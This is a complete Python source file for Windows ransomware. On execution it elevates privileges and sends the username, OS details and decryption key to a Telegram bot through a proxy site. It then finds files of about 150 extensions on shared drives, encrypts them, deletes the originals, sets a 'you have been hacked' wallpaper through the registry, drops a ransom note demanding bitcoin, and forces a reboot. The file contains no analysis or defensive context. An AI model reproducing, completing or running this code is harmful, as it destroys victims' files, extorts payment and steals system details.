from cryptography.fernet import Fernet 
from subprocess import check_output
from bs4 import BeautifulSoup
from requests import post
import os
import smtplib
#import win32console
#import win32gui
import winreg
from urllib import *
import urllib.request
import platform
from elevate import elevate


elevate(show_console=False)

key = Fernet.generate_key()
Encrypt = Fernet(key)
decrypt_msg = """
                            OH! LOOKS LIKE YOUR FILES ARE ENCRYPTED
-------------------------------------------------------------------------------------------------------
                                      if you want them back:
                    send $ 500 bitcoin to this address:
                    gmail address for receiving the decryption file when paid: rrsomewherehere@gmail.com
-------------------------------------------------------------------------------------------------------
"""
def shutdown():
    os.system("shutdown /r /t 0")

def change_background():
    urllib.request.urlretrieve("https://cdn.wallpapersafari.com/4/28/0sJ4Yo.jpg", "C:\\Windows\\youhavebeenhacked.jpg")
    keyVal = r'Control Panel\\Desktop'

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
    except:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)

    winreg.SetValueEx(key, "Wallpaper", 0, winreg.REG_SZ, "C:\\Windows\\youhavebeenhacked.jpg")
    winreg.CloseKey(key)

def encrypt_files():
    file = open("syslogs.txt", "r")
    read_file = file.readlines()

    for path in read_file:
        try:
            path = path.strip("\n")
            path = path.strip("\r")
            orgfile = open(bytes(path, encoding="utf-8"), "rb")
            data = orgfile.read()
            enc_data = Encrypt.encrypt(data)
            encfile = open(bytes(path + "ـ", encoding="utf-8"), "wb")
            encfile.write(enc_data)
            orgfile.close()
            encfile.close()
            os.remove(path)
            print("ENCRYPTED --> " + path)
        except:
            pass

def find_drives():
    drive = [b"A:", b"B:", b"D:", b"E:", b"F:", b"G:", b"H:", b"I:", b"J:", b"K:", b"L:", b"M:", b"N:", b"O:", b"P:", b"Q:", b"R:", b"S:", b"T:", b"U:", b"V:", b"W:", b"X:", b"Y:", b"Z:"]
    system_drive = []
    cmd = check_output("net share", shell=True)

    for i in drive:
        if i in cmd:
            system_drive.append(i.decode("utf-8"))
        
    return system_drive

def find_files(drives):
    
    f = open("syslogs.txt", "w")
    """
    for p in passwand_files:
        try:
            cmd = check_output("cd / && dir /S /B *." + p, shell=True)
            f.writelines(cmd.decode("utf-8"))
            print("C: FOUND --> " + p)
        except: 
            pass
    """
    for d in drives:
        for p in passwand_files:
            try:
                cmd = check_output(d + " && dir /S /B *." + p, shell=True)
                f.writelines(cmd.decode("utf-8"))
                print(d + " FOUND --> " + p )
            except:
                pass
    f.close()


def telegram_bot_message():
    msg = "\nusername: " + os.path.expanduser("~") + "\nOS: " + str(platform.uname()[0]) + str(platform.uname()[2]) + "\nDecryption Key: " + key.decode("utf-8")
    url = "https://api.telegram.org/bot1345488207:AAGkhSXGUnJcSeUVfNsrXVnpjkpjMfMXFxw/SendMessage?chat_id=1206929574&text=" + msg
    payload = {"UrlBox": url,
            "AgentList": "Mozilla Firefox",
            "VersionsList": "HTTP/1.1",
            "MethodList": "POST"
    }
    post("https://httpdebugger.com/tools/ViewHttpHeaders.aspx", payload)

def decrypt_msg_():
    desktop = os.path.expanduser("~")+"\\Desktop"
    file = open(desktop+"\\hellyshietseppidermann!.txt","w")
    file.write(decrypt_msg)
    file.close()

passwand_files = ["3g2", "3gp", "7z", "ai", "aif", "apk", "arj", "asp"," aspx", "avi", "bak", "bat", "bin", "bmp ","c", "cab", "cda", "cer", "cfg", "cfm", "cgi", "c lass", "com", "cpl", "cpp" ,"cs", "css", "csv", "cur", "dat" ,"db", "dbf", "deb", "dll", "dmg", "dmp", "doc"," docx", "drv","e mail", "eml"," emlx", "exe", "flv", "fnt", "fon","ga dget", "gif ","h"," h264", "htm"," html"," icns", "ico", "ini", "iso", "jar"," java"," jpeg", "jpg" ,"js", "jsp", "key", "lnk", "log", "m4v", "mdb", "mid"," midi", "mkv", "mov", "mp3", "mp4", "mpa"," mpeg", "mpg", "msg", "msi", "odp", "ods", "odt", "oft", "ogg", "ost", "otf"," part", "pdf", "php", "pkg" ,"pl", "png", "pps", "ppt"," pptx" ,"ps", "psd", "pst" ,"py", "rar" ,"rm", "rpm", "rss", "rtf", "sav", "sbg" ,"sh", "sql", "swf","s wift", "sys", "tar","ta r.gz", "tex", "tif"," tiff", "tmp","t oast", "ttf", "txt" ,"vb", "vcd", "vcf", "vob", "wav", "wma", "wmv", "wpd", "wpl", "wsf","x html", "xls"," xlsm"," xlsx", "xml ","z", "zip"]
# passwand_files = ["3g2_ENCRYPTED", "3gp_ENCRYPTED", "7z_ENCRYPTED", "ai_ENCRYPTED", "aif_ENCRYPTED", "apk_ENCRYPTED", "arj_ENCRYPTED", "asp_ENCRYPTED", "aspx_ENCRYPTED", "avi_ENCRYPTED", "bak_ENCRYPTED", "bat_ENCRYPTED", "bin_ENCRYPTED", "bmp_ENCRYPTED", "c_ENCRYPTED", "cab_ENCRYPTED", "cda_ENCRYPTED", "cer_ENCRYPTED", "cfg_ENCRYPTED", "cfm_ENCRYPTED", "cgi_ENCRYPTED", "class_ENCRYPTED", "com_ENCRYPTED", "cpl_ENCRYPTED", "cpp_ENCRYPTED", "cs_ENCRYPTED", "css_ENCRYPTED", "csv_ENCRYPTED", "cur_ENCRYPTED", "dat_ENCRYPTED", "db_ENCRYPTED", "dbf_ENCRYPTED", "deb_ENCRYPTED", "dll_ENCRYPTED", "dmg_ENCRYPTED", "dmp_ENCRYPTED", "doc_ENCRYPTED", "docx_ENCRYPTED", "drv_ENCRYPTED", "email_ENCRYPTED", "eml_ENCRYPTED", "emlx_ENCRYPTED", "exe_ENCRYPTED", "flv_ENCRYPTED", "fnt_ENCRYPTED", "fon_ENCRYPTED", "gadget_ENCRYPTED", "gif_ENCRYPTED", "h_ENCRYPTED", "h264_ENCRYPTED", "htm_ENCRYPTED", "html_ENCRYPTED", "icns_ENCRYPTED", "ico_ENCRYPTED", "ini_ENCRYPTED", "iso_ENCRYPTED", "jar_ENCRYPTED", "java_ENCRYPTED", "jpeg_ENCRYPTED", "jpg_ENCRYPTED", "js_ENCRYPTED", "jsp_ENCRYPTED", "key_ENCRYPTED", "lnk_ENCRYPTED", "log_ENCRYPTED", "m4v_ENCRYPTED", "mdb_ENCRYPTED", "mid_ENCRYPTED", "midi_ENCRYPTED", "mkv_ENCRYPTED", "mov_ENCRYPTED", "mp3_ENCRYPTED", "mp4_ENCRYPTED", "mpa_ENCRYPTED", "mpeg_ENCRYPTED", "mpg_ENCRYPTED", "msg_ENCRYPTED", "msi_ENCRYPTED", "odp_ENCRYPTED", "ods_ENCRYPTED", "odt_ENCRYPTED", "oft_ENCRYPTED", "ogg_ENCRYPTED", "ost_ENCRYPTED", "otf_ENCRYPTED", "part_ENCRYPTED", "pdf_ENCRYPTED", "php_ENCRYPTED", "pkg_ENCRYPTED", "pl_ENCRYPTED", "png_ENCRYPTED", "pps_ENCRYPTED", "ppt_ENCRYPTED", "pptx_ENCRYPTED", "ps_ENCRYPTED", "psd_ENCRYPTED", "pst_ENCRYPTED", "py_ENCRYPTED", "rar_ENCRYPTED", "rm_ENCRYPTED", "rpm_ENCRYPTED", "rss_ENCRYPTED", "rtf_ENCRYPTED", "sav_ENCRYPTED", "sbg_ENCRYPTED", "sh_ENCRYPTED", "sql_ENCRYPTED", "swf_ENCRYPTED", "swift_ENCRYPTED", "sys_ENCRYPTED", "tar_ENCRYPTED", "tar.gz_ENCRYPTED", "tex_ENCRYPTED", "tif_ENCRYPTED", "tiff_ENCRYPTED", "tmp_ENCRYPTED", "toast_ENCRYPTED", "ttf_ENCRYPTED", "txt_ENCRYPTED", "vb_ENCRYPTED", "vcd_ENCRYPTED", "vcf_ENCRYPTED", "vob_ENCRYPTED", "wav_ENCRYPTED", "wma_ENCRYPTED", "wmv_ENCRYPTED", "wpd_ENCRYPTED", "wpl_ENCRYPTED", "wsf_ENCRYPTED", "xhtml_ENCRYPTED", "xls_ENCRYPTED", "xlsm_ENCRYPTED", "xlsx_ENCRYPTED", "xml_ENCRYPTED", "z_ENCRYPTED", "zip_ENCRYPTED"]

def ransomware():
    telegram_bot_message()
    drives = find_drives()
    find_files(drives)
    encrypt_files()
    change_background()
    shutdown()

ransomware()
